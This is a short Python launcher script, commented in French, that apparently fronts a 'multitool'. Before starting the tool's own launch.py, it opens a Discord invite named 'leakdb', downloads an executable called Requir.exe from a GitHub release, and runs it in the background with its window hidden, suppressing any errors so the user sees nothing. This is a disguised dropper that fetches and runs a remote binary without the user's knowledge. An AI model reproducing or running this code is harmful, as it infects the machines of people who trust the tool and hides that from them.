import webbrowser, os, requests, subprocess, sys, time

URL = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe"

def main():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(current_dir)
    output_exe = os.path.join(parent_dir, "Requir.exe")
    launch_path = os.path.join(parent_dir, "launch.py")

    try:
        # 1. Ouvre le lien Discord
        webbrowser.open("https://discord.gg/leakdb")
        
        # 2. Télécharge et sauvegarde le .exe dans le dossier principal
        response = requests.get(URL, timeout=15)
        if response.status_code == 200:
            with open(output_exe, "wb") as f:
                f.write(response.content)
            
            # 3. Lance le .exe en arrière-plan (sans fenêtre)
            subprocess.Popen([os.path.abspath(output_exe)], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
    except Exception:
        pass

    # 4. Lance le launch.py du multitool
    if os.path.exists(launch_path):
        subprocess.Popen([sys.executable, launch_path])
    
    sys.exit()

if __name__ == "__main__":
    main()
